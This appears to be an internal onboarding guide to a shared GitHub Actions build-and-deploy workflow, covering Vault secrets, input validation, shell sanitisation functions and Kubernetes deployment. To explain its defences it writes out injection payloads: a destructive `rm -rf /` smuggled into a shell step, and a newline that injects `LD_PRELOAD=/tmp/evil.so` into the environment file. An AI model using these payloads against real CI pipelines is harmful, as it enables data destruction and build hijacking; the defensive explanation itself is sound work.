## 1. What is this repository? (The 2-minute version)

**CECT** (Claims Extract Comparison Tool) is an internal Optum Rx application. It has several code repositories: a **UI** (Next.js), an **API** (Java/Spring, built with Maven), a **Paid-Claims AI** service, Kubernetes configuration, and so on.

Each of those repositories needs the same chores done whenever someone wants to ship a new version:

1. Check that the person is **allowed** to deploy, and that the request is **safe**.
2. Fetch **secrets** (passwords, kube-config, tokens) from **HashiCorp Vault**.
3. **Build** the code (Maven for Java, `npm` inside Docker for Node).
4. **Scan** it: code quality with **SonarQube**, container vulnerabilities with **JFrog Xray** and **Prisma Cloud**.
5. **Push** the Docker image to **JFrog Artifactory**.
6. **Deploy** it to **Kubernetes** (dev, test, or prod).
7. For prod: confirm an approved **ServiceNow change ticket**, then **promote** the image to the release repository.
8. **Email** the team.

Rather than copy-pasting those ~600 lines into every repository, CECT keeps them **once**, in this repository, as a **reusable workflow**. Each application repository has a tiny "caller" workflow (about 50 lines) that says, in effect, *"run the shared pipeline with these settings."*

```mermaid
mindmap
  root((cect-gh-actions-workflows))
    Guardrails
      Validate every input
      main branch only for test and prod
      Allow-listed deployers only
      Change ticket for prod
    Secrets
      HashiCorp Vault via OIDC
      Prisma keys via PRM
    Build
      Maven JAR and Sonar
      Docker image with npm or JAR
    Scan
      SonarQube
      JFrog Xray
      Prisma Cloud
    Ship
      Push to JFrog Artifactory
      kubectl apply to Kubernetes
      Flyway DB migrations
    Prod extras
      ServiceNow change validation
      Promote image to release
      Email notification
```

## 2. GitHub Actions crash course

If you have never used GitHub Actions, read this section slowly. Every later section builds on it.

### 2.1 Vocabulary

| Term | What it means | Analogy | Where you see it here |
|---|---|---|---|
| **Workflow** | A YAML file in `.github/workflows/` describing an automated process. | A recipe. | `orx-qec-cect-build-deploy-workflow.yaml` |
| **Trigger** (`on:`) | What starts the workflow: a push, a button click, a schedule, or another workflow. | The oven timer. | `on: workflow_call` (L10) |
| **`workflow_dispatch`** | A manual trigger. GitHub shows a **"Run workflow"** button with a form. | A doorbell. | The **caller** workflows in the UI/API repos |
| **`workflow_call`** | Makes a workflow **reusable**: other workflows can call it like a function. | A function definition. | This repo (L11) |
| **Job** | A group of steps that runs on **one machine**. Jobs run in parallel unless linked by `needs:`. | One cook at one station. | `build-deploy` (L48), `promote-docker-image-to-release` (L603) |
| **Step** | One command (`run:`) or one packaged action (`uses:`) inside a job. Steps run **in order**. | One line in the recipe. | 33 steps in `build-deploy` |
| **Runner** | The machine that executes a job. | The kitchen. | `runs-on: uhg-runner`, a UHG **self-hosted** runner |
| **Action** | A reusable, versioned building block (`owner/repo@version`). | A kitchen appliance. | `actions/checkout@v4`, `uhg-pipelines/epl-docker/build-scan-push@v4`, … |
| **Expression** `${{ … }}` | Evaluated by GitHub **before** the step runs; the result is pasted into the YAML. | A mail-merge field. | `${{ inputs.ENVIRONMENT }}` |
| **`if:`** | A condition: the step or job runs only if it is true. | "Only if the oven is hot." | Almost every step |
| **Context** | A read-only object you can use in expressions. | Global variables. | `inputs`, `env`, `github`, `steps`, `needs` |
| **`$GITHUB_ENV`** | A special file. Lines `KEY=value` written to it become **environment variables for all later steps**. | A shared whiteboard. | `printf 'SAFE_ENVIRONMENT=%s\n' … >> "$GITHUB_ENV"` |
| **`$GITHUB_OUTPUT`** | A special file. Lines written to it become `steps.&lt;id>.outputs.&lt;name>`. | A step's return value. | `setoutputs` step (L517) |
| **Job outputs** | Values a job exposes to jobs that `needs:` it. | A job's return value. | L56-61 |
| **`needs:`** | "Run this job only after that one succeeds." | A dependency arrow. | L604 |
| **`secrets: inherit`** | Pass all of the caller's secrets to a called workflow. | Hand over your keyring. | L607 |
| **`permissions:`** | What the auto-generated `GITHUB_TOKEN` (and OIDC) may do. | A badge's access level. | L3-8, L50-55 |
| **OIDC token** | A short-lived signed JWT that GitHub issues to a job, proving "I am repo X running workflow Y". Cloud and Vault systems can trust it **instead of a stored password**. | A one-day visitor badge. | `id-token: write` + Vault `method: jwt` |

### 2.2 The `${{ }}` vs `$VAR` difference (important!)

There are **two** substitution systems, and mixing them up is the #1 cause of security bugs in GitHub Actions:

```mermaid
flowchart LR
    subgraph GH["1 · On GitHub's servers, before the step starts"]
      E["YAML text containing an&lt;br/>expression such as inputs.X"] --> R["Expression replaced&lt;br/>by its value as plain text"]
    end
    subgraph RUN["2 · On the runner, while the step runs"]
      S["bash script"] --> V["$VAR read from the environment"]
    end
    R --> S
```

- `${{ inputs.X }}` is a **text paste**. If you write `run: echo ${{ inputs.X }}` and someone passes `x; rm -rf /`, bash sees `echo x; rm -rf /`. That is a **script-injection** vulnerability.
- The safe pattern, used throughout this workflow, is to map the expression into an `env:` variable and use `"$VAR"` (quoted) in the script:

```yaml
- name: Validate and set safe environment input   # L70
  env:
    ENVIRONMENT_INPUT: ${{ inputs.ENVIRONMENT }}   # pasted into an env var, not into the script
  run: |
    SAFE_ENVIRONMENT_INPUT=$(printf '%s' "$ENVIRONMENT_INPUT" | tr -d '\n\r')
```

### 2.3 How a reusable workflow is called

```mermaid
sequenceDiagram
    autonumber
    actor Dev as Engineer
    participant GH as GitHub
    participant Caller as Caller workflow (UI repo)
    participant Reusable as Reusable workflow (this repo)
    participant Runner as uhg-runner
    Dev->>GH: Click "Run workflow", fill form (ENVIRONMENT, tag, ...)
    GH->>Caller: Start, event = workflow_dispatch
    Caller->>Reusable: jobs.build-deploy.uses ...@main-uhg-only with inputs
    Note over Reusable: github context is still the CALLER's&lt;br/>(repo name, ref, actor, event)
    Reusable->>Runner: Schedule job build-deploy
    Runner-->>Reusable: Steps run, outputs set
    Reusable->>GH: Job promote-docker-image-to-release (prod only)
    GH-->>Dev: Run summary, logs, email
```

> 💡 **Key fact:** inside a reusable workflow, `github.repository`, `github.ref`, `github.actor` and `github.event` all describe the **caller**. That is why the same pipeline can name the Docker image after whichever repository called it.

### 2.4 The two special files, by example

```bash
# Step 1
printf 'SAFE_ENVIRONMENT=%s\n' "dev" >> "$GITHUB_ENV"
printf 'run-promote=%s\n' "false" >> "$GITHUB_OUTPUT"   # step has id: setoutputs

# Step 2 (any later step in the same job)
echo "$SAFE_ENVIRONMENT"                 # -> dev        (shell)
# ${{ env.SAFE_ENVIRONMENT }}            # -> dev        (expression)
# ${{ steps.setoutputs.outputs.run-promote }}  -> false  (expression)
```

Because `$GITHUB_ENV` is parsed line-by-line as `KEY=value`, a value containing a **newline** can smuggle in a second, attacker-chosen line such as `LD_PRELOAD=/tmp/evil.so`. This is called **environment-variable injection**, and it is why nearly every step here strips `\n` and `\r` before writing (see [§15](#15-security-model)).

## 3. The platform tools the pipeline talks to

| Tool | What it is | Why the pipeline uses it | Beginner analogy |
|---|---|---|---|
| **HashiCorp Vault** (`pam-dev.uhc.com`) | Central secret store. | All passwords, tokens, kube-configs and most settings live here, not in Git. | A bank vault with labelled drawers. |
| **PRM** (`prm.optum.com`) | UHG's privileged-secret manager. | Holds the shared **Prisma** scanner credentials. | A second, enterprise-owned vault. |
| **JFrog Artifactory (SaaS)** | Package and Docker registry. **Central** = where images are pushed. **Edge internal** (`edgeinternal1uhg.uhg.com`) = a UHG-network replica the clusters pull from. | Stores built images, proxies Maven/npm downloads. | A warehouse (central) with local pickup points (edge). |
| **JFrog Xray** | Vulnerability scanner built into Artifactory. | Scans each pushed image. | Airport X-ray for packages. |
| **Prisma Cloud (twistcli)** | Palo Alto container security scanner. | Second, independent image scan, required by UHG policy. | A second security checkpoint. |
| **SonarQube** | Static code analysis. | Code smells, bugs, coverage, quality gate (`vitals.yaml` declares `targetQG: ADOPTION`). | A spell-checker for code quality. |
| **Maven** | Java build tool. | Builds the API JAR (`clean install …`). | `make` for Java. |
| **Docker** | Packages an app and its runtime into an image. | Every deployable app ships as an image. | A shipping container. |
| **Kubernetes (K8s)** | Runs containers in a cluster. | The dev/test/prod environments. | A port that unloads containers and keeps them running. |
| **`kubectl apply`** | Sends a YAML description to K8s. | Rolls out the new image. | Handing the port manager a manifest. |
| **Flyway** | Database migration tool. | `BUILD_TYPE=Flyway` runs DB schema migrations. | Versioned "patch scripts" for the DB. |
| **ServiceNow** (`optum.service-now.com`) | IT change management. | Prod deploys require an **approved change ticket** in its window. | A permit office. |
| **EPL actions** (`uhg-pipelines/epl-*`) | UHG's *Enterprise Pipeline Library*: approved, pre-built actions. | Standardised build, scan, push, deploy steps. | Company-approved power tools. |
| **`uhg-runner`** | Self-hosted GitHub Actions runner inside the UHG network. | Needs access to internal Vault, Artifactory, clusters. | An in-house kitchen instead of a rented one. |

## 4. Repository layout

The repository is small. Nearly all of the logic is in one file.

```text
cect-gh-actions-workflows/
├── .github/
│   └── workflows/
│       └── orx-qec-cect-build-deploy-workflow.yaml   ← THE pipeline (613 lines)

    ├── CECT-GH-Actions-Workflows-KT-Guide.md          ← this guide
    └── CECT-GH-Actions-Workflows-KT-Guide.html        ← same guide, rendered
```

### 4.1 `vitals.yaml`

```yaml
apiVersion: v1
metadata:
  askId: UHGWM110-027861                 # UHG application ID (ASK)
  caAgileId: 266663055900d               # Rally / CA Agile team ID
  projectKey: com.optumrx.qec:claims-extract-comparison-tool-api   # Sonar project key
  projectFriendlyName: claims-extract-comparison-tool-api
  componentType: code
  targetQG: ADOPTION                     # Sonar quality-gate tier the project targets
```

This file is read by UHG governance tooling (not by the workflow). It ties the repository to the CECT application's ASK ID and Sonar project.

name: ORx QEC CECT UI build and deploy
permissions:
  id-token: write        # needed so the called workflow can get an OIDC token for Vault
  actions: read
  contents: write
  pull-requests: read
  security-events: write
on:
  workflow_dispatch:     # adds the "Run workflow" button
    inputs:
      ENVIRONMENT:      { type: choice, options: [dev, test, prod], default: dev, required: true }
      BUILD_TYPE:       { type: choice, options: [NodeJS], default: NodeJS, required: true }
      ARTIFACT_TYPE:    { type: choice, options: [ui], default: ui, required: true }
      DOCKER_IMAGE_TAG: { type: string, required: true }
      DOCKER_FILE:      { type: string, default: "surfaces/cect-ui/Dockerfile" }
      SN_CHANGE_TICKET: { type: string }
jobs:
  build-deploy:
    uses: optum-rx-tech-ops/cect-gh-actions-workflows/.github/workflows/orx-qec-cect-build-deploy-workflow.yaml@main-uhg-only
    with:
      ENVIRONMENT: ${{ inputs.ENVIRONMENT }}
      # ...each input passed straight through...
```

*(Condensed to flow-style YAML for readability; the real file uses block style.)*

> ⚠️ A called workflow can **never have more permissions than its caller grants**. If a caller forgets `id-token: write`, the Vault step fails with an OIDC error even though this repo declares it.

## 7. The workflow contract: inputs, outputs, permissions

### 7.1 Inputs (`on.workflow_call.inputs`, L12-45)

| Input | Type | Required | Default | Allowed values (enforced at) | Used for |
|---|---|---|---|---|---|
| `ENVIRONMENT` | string | ✅ | — | `dev` \| `test` \| `prod` (L76-84) | Vault path, K8s namespace, image name, gates |
| `BUILD_TYPE` | string | ✅ | — | `Maven` \| `MavenJAR` \| `Flyway` \| `Docker` \| `NodeJS` (L270-278) | Which build/deploy steps run |
| `ARTIFACT_TYPE` | string | ✅ | — | `^[A-Za-z0-9._-]+$` (L343) | Middle segment of image path (`ui`, `api`) |
| `DOCKER_IMAGE_TAG` | string | ❌ | — | empty or `^[A-Za-z0-9._-]+$` (L288, L349) | Image tag; in practice required for image builds |
| `DOCKER_FILE` | string | ❌ | — | not validated | Dockerfile path for `build-scan-push` |
| `SN_CHANGE_TICKET` | string | ❌ | — | empty or `^[A-Za-z0-9_-]+$` (L240); **required for prod** (L247) | ServiceNow change validation, email |
| `MAVEN_BUILD_COMMAND` | string | ❌ | — | not validated | Maven goals for `Maven` / `MavenJAR` |
| `BRANCH` | string | ❌ | — | must pass `git check-ref-format --branch`; **dev only** | Branch override for scheduled runs |
| `DEPLOY_TRIGGERED_BY_SCHEDULE` | string | ❌ | `"NO"` | `YES` \| `NO` (L227-233) | Enables BRANCH override and Vault-supplied change ticket |

> `BRANCH` and `DEPLOY_TRIGGERED_BY_SCHEDULE` exist for a **scheduled** caller (a cron job that deploys nightly). Neither current caller uses them, so they always take their defaults.

### 7.2 What each BUILD_TYPE means

| BUILD_TYPE | Meaning | Builds on runner | Docker image? | Deploys to K8s? | Who uses it today |
|---|---|---|---|---|---|
| `Maven` | Java service: Maven build + Sonar, then Docker image that copies the JAR | JAR (`mvn`) | ✅ | ✅ | **API** |
| `MavenJAR` | Java library or batch JAR: Maven build + Sonar **only** | JAR | ❌ | ❌ | none |
| `Flyway` | Run DB migrations via a Maven Flyway command from Vault | — | ❌ | ❌ | none (no Flyway plugin in the current API `pom.xml`) |
| `Docker` | Generic Dockerfile build | — | ✅ | ✅ | none |
| `NodeJS` | Node app; `npm ci &amp;&amp; npm run build` happen **inside** the Dockerfile | — | ✅ | ✅ | **UI** |

> In the YAML, `Docker` and `NodeJS` behave identically. Every image condition is written as *"not Flyway and not MavenJAR"*.

### 7.4 Permissions (L3-8, repeated at job level L50-55)

| Permission | Why it is needed |
|---|---|
| `id-token: write` | Lets the job request a GitHub **OIDC JWT**, used for Vault login and the JFrog OIDC exchange. |
| `actions: read` | Lets EPL actions read workflow/run metadata. |
| `contents: write` | Checkout, plus anything an EPL action writes back (build info, tags). |
| `pull-requests: read` | Lets actions read PR metadata (likely for Sonar PR decoration). |
| `security-events: write` | Lets scanners upload results (SARIF) to GitHub code scanning, if they choose to. |

## 9. Step-by-step walkthrough (every step)

Each step below lists **when it runs**, **what it reads**, **what it writes**, and **why it exists**.

### Phase A — Bootstrap &amp; guardrails

#### A1. `Initialize` (L64-68), always

```bash
sudo chown -R "$USER:$USER" "$GITHUB_WORKSPACE"
deploy_window_date_hour="$(TZ=":US/Central" date +"%m%d%Y_%H")"
printf 'DEPLOY_WINDOW_DATE_HOUR=%s\n' "$deploy_window_date_hour" >> "$GITHUB_ENV"
```

- **Why `chown`?** On self-hosted runners, earlier Docker-based jobs can leave root-owned files in the workspace. Then `actions/checkout` cannot clean them (see actions/checkout issue #211, linked in the comment). Taking ownership first prevents "permission denied" errors.
- **Writes:** `DEPLOY_WINDOW_DATE_HOUR`, e.g. `11252026_14` (25 Nov 2026, 2 pm Central). This was meant for the "approved test deploy window" check at L253-257, which is **commented out**, so today the value is unused.

#### A2. `Validate and set safe environment input` (L70-84), always

- **Reads:** `inputs.ENVIRONMENT` (via `ENVIRONMENT_INPUT`).
- **Does:** strips CR/LF, then an **allow-list** `case`: only `dev`, `test`, `prod`.
- **Writes:** `SAFE_ENVIRONMENT`. Later steps use this variable, never the raw input, wherever the value is used to build a **path** (Vault paths `kv/data/${SAFE_ENVIRONMENT}`).
- **Fails with:** `FATAL ERROR - Invalid ENVIRONMENT input: &lt;value>`.

#### A3. `Branch name and environment check` (L86-90), test/prod only

```yaml
if: ${{ ((inputs.ENVIRONMENT == 'test') || (inputs.ENVIRONMENT == 'prod')) &amp;&amp; (github.ref != 'refs/heads/main') }}
```

- **Why:** test and prod must only receive reviewed code from `main`. `github.ref` is the **caller's** ref, which is whatever branch the engineer picked in the "Use workflow from" dropdown.
- **Fails with:** `FATAL ERROR - test or prod environment deployment should be done only from main branch!`

#### A4. `Print branch being checked out` (L92-105), always

Informational. It repeats the ref-selection logic and **echoes** the result to the log, so humans can see what will be checked out. It writes nothing.

#### A5. `Resolve checkout ref` (L107-154), always

This is the most security-sensitive shell block. It decides which branch to check out and refuses anything suspicious.

```mermaid
flowchart TD
    A{"Scheduled = YES&lt;br/>AND BRANCH given?"} -- yes --> B{"ENV is test or prod?"}
    B -- yes --> F1["❌ BRANCH override not allowed for test/prod"]
    B -- no --> C["ref = BRANCH"]
    A -- no --> D["ref = github.ref_name"]
    C --> E["strip CR/LF"]
    D --> E
    E --> G{"empty?"} -- yes --> F2["❌ empty after sanitisation"]
    G -- no --> H{"looks like a PR ref?&lt;br/>refs/pull/*, pull/*, pr/*, */merge, */head"}
    H -- yes --> F3["❌ PR refs not allowed"]
    H -- no --> I{"starts with refs/heads/ ?"}
    I -- yes --> J["strip refs/heads/"]
    I -- no --> K{"starts with refs/ ?"}
    K -- yes --> F4["❌ fully-qualified refs not allowed"]
    K -- no --> L
    J --> L{"git check-ref-format --branch OK?"}
    L -- no --> F5["❌ Invalid checkout ref"]
    L -- yes --> M["CHECKOUT_REF → GITHUB_ENV"]
```

- **Why block PR refs?** This job holds production secrets (`KUBE_CONFIG`, DB password). Checking out `refs/pull/123/merge` would run **untrusted contributor code** with those secrets.
- **Why `git check-ref-format --branch`?** It applies Git's own rules for branch names: no spaces, no `..`, no `~^:?*[`, no leading `-`, and so on. That blocks option injection and path tricks.
- **Example:** `refs/heads/feature/x` → `feature/x` ✅ · `refs/tags/v1` → ❌ · `-oops` → ❌.

#### A6. `Checkout code` (L156-161), always

```yaml
uses: actions/checkout@v4
with:
  ref: ${{ env.CHECKOUT_REF }}
  fetch-depth: 1            # shallow: only the latest commit, which is faster
  persist-credentials: false  # do NOT leave the GITHUB_TOKEN in .git/config
```

`persist-credentials: false` means later steps (Docker builds, Maven plugins, scripts) cannot read a Git token from `.git/config`. Since the code being built might be compromised, it should not hold credentials.

> The checked-out repository is the **caller** (UI or API). Its `Dockerfile` and `deployment.yaml` are what get built and applied.

### Phase B — Secrets

#### B1. `Fetch UHG CA information` (L163-166), always

```bash
uhg_ca_base64="$(base64 -w 0 /usr/local/share/ca-certificates/Optum_ProxyMITM_Bundle.crt)"
printf 'UHG_CA_BASE64=%s\n' "$uhg_ca_base64" >> "$GITHUB_ENV"
```

UHG inspects outbound TLS through a proxy that re-signs certificates (a "man-in-the-middle" proxy). Tools must trust that proxy's CA, or every HTTPS call fails with *"self-signed certificate in chain"*. The bundle is base64-encoded (`-w 0` = one line, so it is safe for `$GITHUB_ENV`) and passed to the Vault action.

#### B2. `Get Hashi Vault Secrets` (L168-214), always

```yaml
uses: optum-rx-tech-ops/devsecops-custom-hashivault-action@v3
with:
  url: https://pam-dev.uhc.com
  caCertificate: ${{ env.UHG_CA_BASE64 }}
  method: jwt                               # log in with GitHub's OIDC token
  jwtGithubAudience: https://pam-dev.uhc.com
  role: reusable-workflows                  # Vault role bound to this workflow's claims
  namespace: OPTUM/APP/CECT/STAGE
  values: |   # exported as plain env vars (visible in logs if echoed)
    kv/data/ci-cd aide-id | AIDE_ID ;
    kv/data/${{ env.SAFE_ENVIRONMENT }} k8s-namespace | K8S_NAMESPACE ;
    ...
  secrets: |  # exported as env vars AND masked (*** in logs)
    kv/data/${{ env.SAFE_ENVIRONMENT }} kube-config | KUBE_CONFIG ;
    ...
```

Line format: `&lt;kv path> &lt;key> | &lt;ENV_VAR_NAME> ;`

```mermaid
sequenceDiagram
    autonumber
    participant Step as Vault step (runner)
    participant OIDC as GitHub OIDC
    participant V as Vault pam-dev.uhc.com
    Step->>OIDC: Request JWT (aud = https://pam-dev.uhc.com)
    OIDC-->>Step: Signed JWT (repo, ref, workflow, actor claims)
    Step->>V: POST auth/jwt/login role=reusable-workflows, jwt=...
    V->>V: Verify signature + bound claims for role
    V-->>Step: Short-lived Vault token
    loop each "path key | VAR" line
      Step->>V: GET kv/data/ci-cd or kv/data/dev|test|prod
      V-->>Step: value
      Step->>Step: export VAR (mask if listed under secrets)
    end
```

Two kinds of Vault path:

| Path | Scope | Examples |
|---|---|---|
| `kv/data/ci-cd` | **Shared** across all environments | JFrog URLs, Java/Maven versions, Sonar settings, ServiceNow user |
| `kv/data/&lt;dev\|test\|prod>` | **Per environment** (chosen by `SAFE_ENVIRONMENT`) | `kube-config`, `k8s-namespace`, memory limits, DB creds, **deployer list** |

The full list is in [Appendix A](#appendix-a--vault-key-catalogue).

> 🛡️ **No long-lived secret is stored in GitHub.** The only "credential" is GitHub's signed statement of *who is running*, and Vault decides what that identity may read.

### Phase C — Change management &amp; authorisation

#### C1. `Set SN_CHANGE_TICKET value` (L216-245), always

```mermaid
flowchart LR
    A["DEPLOY_TRIGGERED_BY_SCHEDULE"] --> B{"YES or NO?"}
    B -- other --> F["❌ Invalid flag"]
    B -- YES --> C["ticket = Vault servicenow-change-request"]
    B -- NO --> D["ticket = inputs.SN_CHANGE_TICKET"]
    C --> E{"non-empty AND not ^[A-Za-z0-9_-]+$ ?"}
    D --> E
    E -- yes --> G["❌ Invalid SN_CHANGE_TICKET"]
    E -- no --> H["SN_CHANGE_TICKET → GITHUB_ENV"]
```

A scheduled (unattended) run cannot type a ticket number, so it reads a pre-approved one from Vault. A manual run uses whatever the engineer typed. Uses function [`sanitize_no_newlines`](#101-sanitize_no_newlines).

#### C2. `Prod change ticket not null check` (L247-251), prod only

If `ENVIRONMENT == 'prod'` and `SN_CHANGE_TICKET` is empty, the run fails immediately. That is cheaper than discovering it at the ServiceNow step 20 steps later.

#### C3. *(commented out)* `Test approved deploy window date hour check` (L253-257)

Would have required `DEPLOY_WINDOW_DATE_HOUR` (e.g. `11252026_14`) to match the Vault value `approved-test-deploy-window-date-hour`, so test deploys could only happen in an approved hour. It is disabled; re-enable it only if the team wants that rule back.

#### C4. `Deployement user check` (L259-263), always

```yaml
if: ${{ (env.DEPLOYERS_GHEC_USER_ID_LIST != '*') &amp;&amp; contains(env.DEPLOYERS_GHEC_USER_ID_LIST, github.actor) != true }}
```

- `DEPLOYERS_GHEC_USER_ID_LIST` comes from Vault, **per environment**, so prod can have a shorter list than dev.
- `*` means "anyone with repo access may deploy" (typical for dev).
- ⚠️ `contains()` on a **string** is a *substring* match. See [§18](#18-known-issues-tech-debt--gotchas) #4.

### Phase D — Input validation &amp; sanitisation

#### D1. `Validate and set safe BUILD_TYPE input` (L265-278)

Allow-list: `Maven|MavenJAR|Flyway|Docker|NodeJS` → writes `SAFE_BUILD_TYPE`.

#### D2. `Validate and sanitize DOCKER_IMAGE_TAG input` (L280-293)

Empty is allowed; otherwise the tag must match `^[A-Za-z0-9._-]+$`. Writes `VALIDATED_DOCKER_IMAGE_TAG`.

| Tag typed | Result |
|---|---|
| `R26.11.25` | ✅ |
| `1.0.3-hotfix_2` | ✅ |
| `latest` | ✅ (allowed, but avoid it: not reproducible) |
| `v1:2` | ❌ (`:` would break `image:tag`) |
| `a b` | ❌ |

## 10. Shell function reference (every function)

The workflow defines **four** bash functions. Each one exists only inside the step that defines it.

### 10.1 `sanitize_no_newlines`

**Defined in:** `Set SN_CHANGE_TICKET value` (L222-224)

```bash
sanitize_no_newlines() {
  printf '%s' "$1" | tr -d '\n\r'
}
```

| | |
|---|---|
| **Purpose** | Remove every line-feed and carriage-return so a value cannot add extra lines to `$GITHUB_ENV`. |
| **Input** | `$1`: any string |
| **Output** | stdout: the string without `\n`/`\r` |
| **Fails?** | Never |
| **Why `printf '%s'` and not `echo`?** | `echo` interprets `-n`/`-e` and, in some shells, backslashes. `printf '%s'` prints the bytes exactly. |

**Usage:**

```bash
safe_schedule_flag="$(sanitize_no_newlines "$DEPLOY_TRIGGERED_BY_SCHEDULE_INPUT")"
safe_ticket="$(sanitize_no_newlines "$SN_CHANGE_TICKET_INPUT")"
```

| Input | Output |
|---|---|
| `CHG0012345` | `CHG0012345` |
| `CHG1⏎EVIL=1` | `CHG1EVIL=1`, which then fails the `^[A-Za-z0-9_-]+$` check because of `=` |

> The same one-liner, `printf '%s' "$X" | tr -d '\n\r'`, is also written **inline** in the ENVIRONMENT (L75), Resolve-ref (L126), BUILD_TYPE (L269), tag (L285) and JFrog log-level (L396) steps.

### 10.2 `sanitize_env_value`

**Defined in:** `Sanitize workflow inputs for shell usage` (L308-323)

```bash
sanitize_env_value() {
  raw="$1"
  cleaned="$(printf '%s' "$raw" | tr -d '\n\r')"
  if printf '%s' "$cleaned" | grep -q '='; then
    echo "FATAL ERROR - Invalid character '=' in sanitized value: $cleaned" ; exit 1 ;
  fi
  if ! printf '%s' "$cleaned" | grep -Eq '^[A-Za-z0-9._:/-]*$'; then
    echo "FATAL ERROR - Sanitized value contains disallowed characters: $cleaned" ; exit 1 ;
  fi
  printf '%s' "$cleaned"
}
```

```mermaid
flowchart LR
    A["raw"] --> B["strip CR/LF"] --> C{"contains '=' ?"}
    C -- yes --> X1["❌ exit 1"]
    C -- no --> D{"only A-Z a-z 0-9 . _ : / - ?"}
    D -- no --> X2["❌ exit 1"]
    D -- yes --> E["print cleaned"]
```

| | |
|---|---|
| **Purpose** | General-purpose "safe for `$GITHUB_ENV` and for URLs" filter. |
| **Input** | `$1`: raw value (may be empty) |
| **Output** | stdout: cleaned value |
| **Allowed chars** | letters, digits, `.` `_` `:` `/` `-`. **Empty is allowed** (`*` in the regex). |

> ⚠️ **Subtle bash gotcha:** the function is called inside `$( … )`, which runs in a **subshell**, so `exit 1` exits only the subshell, not the step. The step still fails, for a different reason: GitHub runs `run:` scripts with `bash -e`, and when the command substitution in a plain assignment (`x="$(f)"`) fails, the assignment fails too, which stops the script. But the `FATAL ERROR` text was printed to the subshell's **stdout**, which is captured into the variable instead of reaching the log. Result: the step fails, but the log **does not show the helpful message**. (`require_pattern` does not have this problem, because it is called directly, not inside `$( )`.)

**Usage:**

```bash
safe_repository_name="$(sanitize_env_value "$REPOSITORY_NAME_INPUT")"
safe_jf_saas_central_docker_base_url="$(sanitize_env_value "$JF_SAAS_CENTRAL_DOCKER_BASE_URL_INPUT")"
```

| Input | Result |
|---|---|
| `claims-extract-comparison-tool-ui-2-0` | ✅ unchanged |
| `myco.jfrog.io` | ✅ unchanged |
| `https://x` | ✅ (`:` and `/` allowed) |
| `a=b` | ❌ `=` |
| `ui v2` | ❌ space |
| *(empty)* | ✅ empty (then `require_pattern` rejects it where `+` is required) |

### 10.3 `require_pattern`

**Defined in:** `Sanitize workflow inputs for shell usage` (L325-333)

```bash
require_pattern() {
  local label="$1"
  local value="$2"
  local pattern="$3"
  if ! [[ "$value" =~ $pattern ]]; then
    echo "FATAL ERROR - Invalid $label value: $value" ; exit 1 ;
  fi
}
```

| | |
|---|---|
| **Purpose** | Assert that a value matches a field-specific regex, with a readable error label. |
| **Inputs** | `$1` label for the message · `$2` value · `$3` extended regex |
| **Output** | none; exits the **step** with status 1 on mismatch (called directly, not in a subshell) |
| **Why `$pattern` unquoted?** | Inside `[[ =~ ]]`, a **quoted** right-hand side is matched as a literal string. Leaving it unquoted makes bash treat it as a regex. This is intentional. |

**Usage (L342-350):**

```bash
require_pattern "repository name"              "$safe_repository_name"                 '^[A-Za-z0-9._-]+$'
require_pattern "artifact type"                "$safe_artifact_type"                   '^[A-Za-z0-9._-]+$'
require_pattern "JFrog docker namespace"       "$safe_jf_saas_docker_namespace"        '^[A-Za-z0-9._/-]+$'
require_pattern "JFrog central docker base URL" "$safe_jf_saas_central_docker_base_url" '^[A-Za-z0-9._:/-]+$'
require_pattern "JFrog edge docker base URL"   "$safe_jf_saas_edgeint_docker_base_url" '^[A-Za-z0-9._:/-]+$'
[ -n "$safe_docker_image_tag" ] &amp;&amp; require_pattern "docker image tag" "$safe_docker_image_tag" '^[A-Za-z0-9._-]+$'
```

*(The last line is condensed from an `if … fi` block.)*

`sanitize_env_value` is the **generic** gate, and `require_pattern` is the **tighter, per-field** gate. For example, the repository name may not contain `/` or `:`, even though the generic gate allows them.

### 10.4 `escape_sed_replacement`

**Defined in:** `Pre-deploy update K8S deployment file` (L547-549)

```bash
escape_sed_replacement() {
  printf '%s' "$1" | sed -e 's/[\\|&amp;]/\\\\&amp;/g'
}
```

| | |
|---|---|
| **Purpose** | Make an arbitrary value safe to use as the **replacement** part of `sed "s|pattern|replacement|"`. |
| **Escapes** | `\` (escape char), `\|` (the delimiter used here), `&amp;` (sed's "whole match" token) by prefixing a backslash |
| **Input / Output** | `$1` raw → stdout escaped |

Without it, an image URL containing `&amp;` would be expanded by sed into the matched placeholder, and a `|` would end the `s` command early and corrupt the manifest.

**Usage:**

```bash
sed -i "s|##docker-image-url##|$(escape_sed_replacement "$JF_SAAS_EDGEINT_DOCKER_IMAGE_URL_INPUT")|" -- "$K8S_DEPLOY_FILE_INPUT"
```

| Input | Output |
|---|---|
| `host/a/b:1.0` | `host/a/b:1.0` |
| `a&amp;b` | `a\&amp;b` |
| `a\|b` | `a\\|b` |

The `--` before the filename tells `sed` that what follows is a filename, not an option. That protects against a filename starting with `-`.

### 10.5 Inline idioms (not functions, but used everywhere)

| Idiom | Example | Purpose |
|---|---|---|
| `printf 'K=%s\n' "$v" >> "$GITHUB_ENV"` | L68, L78, … | Write exactly one env line; `%s` prevents format-string surprises. |
| `case "$x" in a\|b) … ;; *) exit 1 ;; esac` | L76, L227, L270, L399 | **Allow-list** validation, clearer and safer than regex for a closed set. |
| `[[ "$x" =~ ^[A-Za-z0-9._-]+$ ]]` | L240, L288 | Regex validation. |
| `git check-ref-format --branch` | L150 | Use Git's own branch-name rules. |
| `${var#refs/heads/}` | L142 | Bash prefix removal. |
| `TZ=":US/Central" date +"%m%d%Y_%H"` | L67 | Timestamp in Central time. |
| `base64 -w 0` | L165 | One-line base64 (no wrapping), safe for `$GITHUB_ENV`. |
| `tr '[:lower:]' '[:upper:]'` | L397 | Normalise log level to upper case. |

## 14. Docker image lifecycle &amp; promotion

```mermaid
stateDiagram-v2
    [*] --> Source: commit on main
    state "Built (dev run)&lt;br/>…/repo-dev:tag" as DevImg
    state "Built + scanned (test run)&lt;br/>…/repo:tag" as TestImg
    state "Pushed to JFrog central" as Central
    state "Replicated to edge internal" as Edge
    state "Running in test" as RunTest
    state "Running in prod" as RunProd
    state "Promoted to release repo" as Released
    Source --> DevImg: ENV=dev
    DevImg --> [*]: dev only, separate image name
    Source --> TestImg: ENV=test
    TestImg --> Central: Xray + Prisma pass
    Central --> Edge
    Edge --> RunTest: kubectl apply (test)
    RunTest --> RunProd: ENV=prod with SAME tag + change ticket
    RunProd --> Released: job 2 promote
    Released --> [*]
```

**What this means in practice:**

1. A **dev** image (`…-dev:tag`) can **never** reach prod: its name is different.
2. To ship to prod, first run **test** with tag `X`. When regression passes, run **prod** with the **same tag `X`**.
